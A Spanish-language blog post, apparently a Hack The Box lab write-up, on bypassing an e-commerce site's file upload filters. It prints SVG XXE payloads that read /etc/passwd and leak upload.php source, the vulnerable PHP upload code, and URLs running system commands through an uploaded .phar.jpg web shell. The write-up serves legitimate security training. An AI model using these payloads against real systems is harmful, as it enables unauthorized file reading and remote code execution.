@@ -1,0 +1,512 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head><title>
+    
+    Laboratorio De File Upload | 
+    
+    CHL Blog
+</title>
+
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<link rel="canonical" href="https://chlorenzo.com/pagina_web/blog/write-ups/htb/m%C3%B3dulos/laboratorio-de-file-upload/" />
+<link rel="icon" type="image/png" href="https://chlorenzo.com/image/favicon.ico">
+
+
+<meta name="description" content="
+    Durante el laboratorio se testearion los foltros de subida de archivos en la aplicación de e-commerce se identificaron múltiples vulnerabilidades que permitieron llegar hasta la ejecución remota de código (RCE) en el servidor.
+    "
+/>
+<meta property="og:description" content="
+    Durante el laboratorio se testearion los foltros de subida de archivos en la aplicación de e-commerce se identificaron múltiples vulnerabilidades que permitieron llegar hasta la ejecución remota de código (RCE) en el servidor.
+    " 
+/>
+
+
+
+
+<meta property="og:title" content="Laboratorio de File Upload" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://chlorenzo.com/pagina_web/blog/write-ups/htb/m%C3%B3dulos/laboratorio-de-file-upload/" /><meta property="article:section" content="pagina_web" />
+<meta property="article:published_time" content="2025-09-07T00:00:00+00:00" />
+<meta property="article:modified_time" content="2025-09-07T00:00:00+00:00" />
+
+
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Laboratorio de File Upload">
+  <meta name="twitter:description" content="Durante el laboratorio se testearion los foltros de subida de archivos en la aplicación de e-commerce se identificaron múltiples vulnerabilidades que permitieron llegar hasta la ejecución remota de código (RCE) en el servidor.">
+
+
+  <meta itemprop="name" content="Laboratorio de File Upload">
+  <meta itemprop="description" content="Durante el laboratorio se testearion los foltros de subida de archivos en la aplicación de e-commerce se identificaron múltiples vulnerabilidades que permitieron llegar hasta la ejecución remota de código (RCE) en el servidor.">
+  <meta itemprop="datePublished" content="2025-09-07T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2025-09-07T00:00:00+00:00">
+  <meta itemprop="wordCount" content="668">
+  <meta itemprop="keywords" content="Hackthebox,File Upload">
+
+
+
+
+<link rel="stylesheet" href="https://chlorenzo.com/main.min.css">
+
+
+
+
+
+<script src="https://chlorenzo.com/bundle.js"></script>
+
+
+
+
+
+
+
+<script data-ad-client="adsense-key" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+
+
+
+
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-4G9W14SLG4"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-4G9W14SLG4');
+</script>
+
+
+
+
+
+
+</head>
+
+<body><header id="header">
+  <div class="top-bar">
+    <div class="container-md">
+
+      <div class="row align-items-center">
+        <div class="col-3 col-sm-4 social-buttons d-none d-sm-block">
+          <ul>
+    
+    
+
+    
+    <li>
+        <a href="https://www.youtube.com/@CHL_Hands_On" target="_blank">
+            <i class="fab fa-youtube"></i></a>
+    </li>
+    
+
+    
+    <li>
+        <a href="https://www.instagram.com/19chl96/" target="_blank">
+            <i class="fab fa-instagram"></i></a>
+    </li>
+    
+
+    
+    <li>
+        <a href="https://github.com/chernadez321" target="_blank">
+            <i class="fab fa-github"></i></a>
+    </li>
+    
+
+    
+
+    
+    <li>
+        <a href="https://www.linkedin.com/in/chlinked/" target="_blank">
+            <i class="fab fa-linkedin"></i></a>
+    </li>
+    
+
+</ul>
+        </div>
+
+        <div class="ra-toggler col-3 col-sm-4 d-block d-sm-none">
+          <button class="bg-dark" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
+            <i class="fas fa-bars"></i>
+          </button>
+        </div>
+
+        <div class="col-6 col-sm-4">
+          <h2 class="title"><a href="https://chlorenzo.com/">CHL Blog</a></h2>
+        </div>
+
+        
+        <div class="col-3 col-sm-4">
+          <div class="col col-md-8 offset-md-4 d-none d-sm-block">
+            <form id="cse-search-box-form-id" class="input-group search-bar" onsubmit="return executeQuery('lg');"
+              role="search">
+              <input id="cse-search-input-box-id" type="text" class="form-control" placeholder="Search">
+              <button class="btn" type="submit">
+                <i class="fa fa-search"></i>
+              </button>
+            </form>
+          </div>
+        </div>
+        
+
+      </div>
+    </div>
+  </div>
+
+  <div class="container-md">
+    <nav class="navbar navbar-expand-sm navbar-dark bg-dark sticky-top">
+      <div class="collapse navbar-collapse" id="navbarNav">
+        <ul class="navbar-nav mx-auto">
+
+          <li class="nav-item d-block d-sm-none">
+            <ul class="social-buttons">
+              <ul>
+    
+    
+
+    
+    <li>
+        <a href="https://www.youtube.com/@CHL_Hands_On" target="_blank">
+            <i class="fab fa-youtube"></i></a>
+    </li>
+    
+
+    
+    <li>
+        <a href="https://www.instagram.com/19chl96/" target="_blank">
+            <i class="fab fa-instagram"></i></a>
+    </li>
+    
+
+    
+    <li>
+        <a href="https://github.com/chernadez321" target="_blank">
+            <i class="fab fa-github"></i></a>
+    </li>
+    
+
+    
+
+    
+    <li>
+        <a href="https://www.linkedin.com/in/chlinked/" target="_blank">
+            <i class="fab fa-linkedin"></i></a>
+    </li>
+    
+
+</ul>
+            </ul>
+          </li>
+
+          
+          
+          <li class="nav-item">
+            <a class="nav-link 
+              
+              " 
+              href="https://chlorenzo.com/">
+              Home
+            </a>
+          </li>
+          
+          
+          
+          <li class="nav-item dropdown">
+            <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-bs-toggle="dropdown">
+              Blog
+            </a>
+            <div class="dropdown-menu">
+              
+              
+                <a class="dropdown-item" href="https://chlorenzo.com/pagina_web/blog/seguridad_para_todos/">Seguridad para todos</a>
+              
+              
+              
+                <a class="dropdown-item" href="https://chlorenzo.com/pagina_web/blog/write-ups/">Write-ups</a>
+              
+              
+              
+                <div class="dropdown-divider"></div>
+              
+              
+              
+                <a class="dropdown-item" href="https://chlorenzo.com/tags/">Búsqueda por etiquetas</a>
+              
+              
+            </div>
+          </li>
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link 
+              
+              " 
+              href="https://chlorenzo.com/pagina_web/trayectoria/">
+              Trayectoria
+            </a>
+          </li>
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link 
+              
+              " 
+              href="https://chlorenzo.com/pagina_web/contact/">
+              Contacto
+            </a>
+          </li>
+          
+          
+        </ul>
+
+        
+        <form id="cse-search-box-form-id2" class="d-flex search-bar d-block d-sm-none"
+          onsubmit="return executeQuery('xs');" role="search">
+          <input id="cse-search-input-box-id2" type="text" class="form-control" placeholder="Search">
+          <button class="btn" type="submit">
+            <i class="fa fa-search"></i>
+          </button>
+        </form>
+        
+
+      </div>
+    </nav>
+  </div>
+</header>
+
+<main class="blog-content">
+    <div class="container-md">
+        <div class="row">
+            
+            <div class="col-lg-2 d-none d-xl-block">
+                <div class="ad-left-offset"></div>
+                
+            </div>
+
+            <div class="col-md-12 col-lg-8 px-lg-4">
+                
+
+                <h1 class="title">Laboratorio de File Upload</h1>
+
+                <div class="container-fluid px-0 mb-4">
+                    <div class="row align-items-end">
+                        <div class="col-md-4 date-time">
+                            <span class="date">
+    Sep 7, 2025
+</span>
+                            &centerdot;
+                            <span class="time-to-read">
+    4 mins read</span>
+                        </div>
+
+                        <div class="col-md-8 tags ">
+                            
+                            <a href="https://chlorenzo.com/tags/hackthebox"><span
+                                    class="tag bg-dark">hackthebox</span></a>
+                            
+                            <a href="https://chlorenzo.com/tags/file-upload"><span
+                                    class="tag bg-dark">File Upload</span></a>
+                            
+                        </div>
+                    </div>
+                </div>
+
+                
+
+                <p><img src="../../../../../images/Miniaturas/file_upload.png" alt=""></p>
+<h4 id="enunciado">Enunciado</h4>
+<p>Se le ha contratado para realizar una prueba de penetración en la aplicación web de comercio electrónico de una empresa. La aplicación web se encuentra en sus primeras etapas, por lo que solo probará los formularios de carga de archivos que encuentre.</p>
+<p>Intente utilizar lo que aprendió en este módulo para comprender cómo funciona el formulario de carga y cómo omitir varias validaciones existentes (si las hay) para obtener la ejecución remota de código en el servidor back-end.</p>
+<hr>
+<p><strong>Intente explotar el formulario de carga para leer la bandera que se encuentra en el directorio raíz &ldquo;/&rdquo;.</strong>
+Accedemos a la página web que nos ponen.
+<img src="../../../../../images/HTB_modulos/File_upload_lab_1/flag_1-1.png" alt="">
+Donde vemos que en la pestaña de <strong>Contact Us</strong>
+<img src="../../../../../images/HTB_modulos/File_upload_lab_1/flag_1-2.png" alt="">
+Vemos el campo de subida que debemos testear. Vemos el código donde se está validando la subida del archivo y es bastante similar al que nos hemos encontrado en el modulo.
+<img src="../../../../../images/HTB_modulos/File_upload_lab_1/flag_1-3.png" alt="">
+Con <code>Burpsuite</code> fuzzeamos las extensiones para ver si podemos saltar los filtros de la aplicación.
+<img src="../../../../../images/HTB_modulos/File_upload_lab_1/flag_1-4.png" alt="">
+Al fuzzear vemos que la mayoría de las extensiones .php estan bloqueadas sin embargo, las extensiones <code>.pht</code> y <code>.phar</code> al parecer no están en la <code>blacklist</code> que está validando los tipos sin embargo, se ve que no están en la whitelist dado que no es jpg, png o jpeg. Recordamos que estamos en un campo donde debemos subir imágenes.
+Entonces con estas 2 extensiones vamos a intentar combinarlas con las extensiones válidas a ver si podemos pasar los filtros.
+Luego de haber intentado en repetidas ocasiones la subida de archivos aplicamos uno de los conceptos que nos explicaron al final del modulo y es <code>XXE</code> en archivo <code>SVG</code>.</p>
+<ol>
+<li>Primero lo que hice fue subir un archivo <code>.jpg</code> e interceptar la solicitud con <code>Burpsuite</code>.</li>
+<li>Luego le modifique la extensión a <code>.svg.jpg</code>, me respondió bien.
+<img src="../../../../../images/HTB_modulos/File_upload_lab_1/flag_1-5.png" alt=""></li>
+<li>Cambiamos el contenido para inyectar el <code>XXE</code></li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE svg [ &lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;&gt;</span> ]&gt;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;svg&gt;</span>&amp;xxe;<span style="color:#f92672">&lt;/svg&gt;</span>
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/File_upload_lab_1/flag_1-6.png" alt="">
+4. Que sucede como vemos que podemos leer archivos necesitamos saber donde se suben nuestras imágenes, para poder consumir esos recursos cuando se suban al servidor. Vemos que le estamos haciendo <code>POST</code>  a <code>/contact/upload.php</code>. Vamos a revisar el contenido de <code>upload.php</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE svg [ &lt;!ENTITY xxe SYSTEM &#34;php://filter/convert.base64-encode/resource=upload.php&#34;&gt;</span> ]&gt;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;svg&gt;</span>&amp;xxe;<span style="color:#f92672">&lt;/svg&gt;</span>
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/File_upload_lab_1/flag_1-7.png" alt="">
+Copiamos el contenido en base64 en un decodificador online mismo y revisamos. Y tenemos esto:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">require_once</span>(<span style="color:#e6db74">&#39;./common-functions.php&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// uploaded files directory
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$target_dir <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./user_feedback_submissions/&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// rename before storing
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$fileName <span style="color:#f92672">=</span> <span style="color:#a6e22e">date</span>(<span style="color:#e6db74">&#39;ymd&#39;</span>) <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;_&#39;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">basename</span>($_FILES[<span style="color:#e6db74">&#34;uploadFile&#34;</span>][<span style="color:#e6db74">&#34;name&#34;</span>]);
+</span></span><span style="display:flex;"><span>$target_file <span style="color:#f92672">=</span> $target_dir <span style="color:#f92672">.</span> $fileName;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// get content headers
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$contentType <span style="color:#f92672">=</span> $_FILES[<span style="color:#e6db74">&#39;uploadFile&#39;</span>][<span style="color:#e6db74">&#39;type&#39;</span>];
+</span></span><span style="display:flex;"><span>$MIMEtype <span style="color:#f92672">=</span> <span style="color:#a6e22e">mime_content_type</span>($_FILES[<span style="color:#e6db74">&#39;uploadFile&#39;</span>][<span style="color:#e6db74">&#39;tmp_name&#39;</span>]);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// blacklist test
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/.+\.ph(p|ps|tml)/&#39;</span>, $fileName)) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Extension not allowed&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">die</span>();
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// whitelist test
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/^.+\.[a-z]{2,3}g$/&#39;</span>, $fileName)) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Only images are allowed&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">die</span>();
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// type test
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">foreach</span> (<span style="color:#66d9ef">array</span>($contentType, $MIMEtype) <span style="color:#66d9ef">as</span> $type) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/image\/[a-z]{2,3}g/&#39;</span>, $type)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Only images are allowed&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">die</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// size test
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> ($_FILES[<span style="color:#e6db74">&#34;uploadFile&#34;</span>][<span style="color:#e6db74">&#34;size&#34;</span>] <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">500000</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;File too large&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">die</span>();
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">move_uploaded_file</span>($_FILES[<span style="color:#e6db74">&#34;uploadFile&#34;</span>][<span style="color:#e6db74">&#34;tmp_name&#34;</span>], $target_file)) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">displayHTMLImage</span>($target_file);
+</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;File failed to upload&#34;</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Vemos que nos muestran el directorio de subida de archivos, renombran los archivos antes de almacenarlos y vemos las expresiones regulares que no nos permitían subir ciertos tipos de archivos.
+Luego de subir fotos y entender el nombre que le ponen para almacenar los archivos en el servidor que es siguiente formato:
+<code>YYMMDD_nombrearchivo.ext</code>
+Ejemplo:
+<code>250907_shell.phar.jpg</code>
+Que hice yo subí una imagen desde el formulario y la vi accediendo a la url
+Accedemos a la ruta:
+<code>http://IP:Puerto/contact/user_feedback_submissions/250907_img.jpg</code>
+Luego le cambié la extensión en local y volvi a subirla:
+<code>http://IP:Puerto/contact/user_feedback_submissions/250907_imp.phar.jpg</code>
+También me dejo subirla.
+Luego lo que hice fue editar la foto introduciendo el comando de php para obtener una shell cuando consuma la foto. La subí nuevamente.
+<img src="../../../../../images/HTB_modulos/File_upload_lab_1/flag_1-8.png" alt=""></p>
+<p>Accedemos a la url:
+<code>http://IP:Puerto/contact/user_feedback_submissions/250907_img.phar.jpg?cmd=id</code>
+<img src="../../../../../images/HTB_modulos/File_upload_lab_1/flag_1-9.png" alt=""></p>
+<p>Y vemos como nos ejecuta el comando a nivel de sistema.
+Ya teniendo capacidad de ejecutar comandos en el servidor buscamos la flag.
+<code>http://IP:Puerto/contact/user_feedback_submissions/250907_img.phar.jpg?cmd=ls /</code>
+<code>http://IP:Puerto/contact/user_feedback_submissions/250907_img.phar.jpg?cmd=cat /flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt</code></p>
+<p><img src="../../../../../images/HTB_modulos/File_upload_lab_1/flag_1-10.png" alt=""></p>
+<p>Si te sirvió de algo este tutorial ya para mi es más que suficiente, si me puedes decir en que podemos mejorar te lo voy a agradecer un montón.</p>
+
+
+                <div id="social-media-share">
+	<p><i>Escríbeme por cualquiera de las vías</i></p>
+	
+	<div class="share-buttons">
+	    
+		<a href="https://www.instagram.com/19chl96/" 
+   			target="_blank" 
+   			title="Sígueme en Instagram">
+    		<img src=https://chlorenzo.com/icons/45px/instagram.png alt="Instagram">
+		</a>
+
+		<a  href="https://www.linkedin.com/in/chlinked/"
+	        onclick="socialMediaPopUp(this.href, '', 900, 500); return false;"
+	        title="Share on LinkedIn. Opens in a new window." >
+	        <img src=https://chlorenzo.com/icons/48px/linkedin.png>
+	    </a>
+
+	    <a href="https://mail.google.com/mail/?view=cm&fs=1&to=chlorenzo96@gmail.com&su=Para Carlos&body=Hola." 
+   		   target="_blank" 
+   		   title="Enviar correo usando Gmail">
+    	<img src=https://chlorenzo.com/icons/48px/email.png alt="Email">
+		</a>
+
+		
+
+	</div>
+</div>
+
+
+
+                
+                <br>
+                <div id="disqus_thread"></div>
+<script type="text/javascript">
+    (function () {
+        
+        
+        if (window.location.hostname == "localhost")
+            return;
+
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        var disqus_shortname = '';
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+            </div>
+
+            <div class="col-lg-2 d-none d-xl-block">
+                <div class="ad-right-offset"></div>
+                
+            </div>
+        </div>
+    </div>
+</main>
+
+<footer class="bg-dark text-light py-4">
+    <div class="container-md">
+        <div class="row justify-content-center">
+            <div class="col-12">
+                <nav class="navbar navbar-expand-sm navbar-dark bg-dark justify-content-center">
+                    <ul class="navbar-nav">
+                        <li class="nav-item">
+                            <a class="nav-link" href="https://chlorenzo.com/">Home</a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" href="https://chlorenzo.com/pagina_web/blog/seguridad_para_todos/">Seguridad para todos</a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" href="https://chlorenzo.com/pagina_web/blog/write-ups/">Write-ups</a>
+                        </li>
+                    </ul>
+                </nav>
+            </div>
+        </div>
+    </div>
+    <div class="text-center mt-3">
+        <p>© 2025 Carlos Hernández Lorenzo</p>
+    </div>
+</footer>
+
+
+<script async src="https://cse.google.com/cse.js?cx=google-cse-key"></script>
+<gcse:searchresults-only></gcse:searchresults-only>
+
+</body>
+
+</html>
